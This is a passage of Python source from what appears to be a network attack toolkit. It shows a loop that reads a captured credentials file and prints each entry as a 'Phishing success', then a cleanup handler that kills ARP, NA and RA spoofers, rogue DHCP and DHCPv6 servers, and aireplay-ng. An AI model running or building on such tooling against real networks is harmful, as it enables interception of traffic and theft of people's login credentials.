                    for credentials in credentials_file_descriptor.readlines():
                        credentials_list = credentials.split(' ')
                        Base.print_success("Phishing success: ", credentials_list[0],
                                           " credentials: ", credentials_list[1], " ", credentials_list[2][:-1])
                except IndexError:
                    pass
                credentials_file_descriptor.close()

                # Rewrite credentials file size
                credentials_file_size = stat(credentials_file_name).st_size

            # Wait
            sleep(1)

    except KeyboardInterrupt:

        # Print info message
        Base.print_info("Exit ...")

        # Kill subprocess
        Base.kill_process_by_name('arp_spoof')
        Base.kill_process_by_name('na_spoof')
        Base.kill_process_by_name('ra_spoof')
        Base.kill_process_by_name('dhcp_rogue_server')
        Base.kill_process_by_name('dhcpv6_rogue_server')
        Base.kill_process_by_name('apple_rogue_dhcp')
        Base.kill_process_by_name('aireplay-ng')

        # Exit from Main function
        exit(0)

    # endregion

# endregion
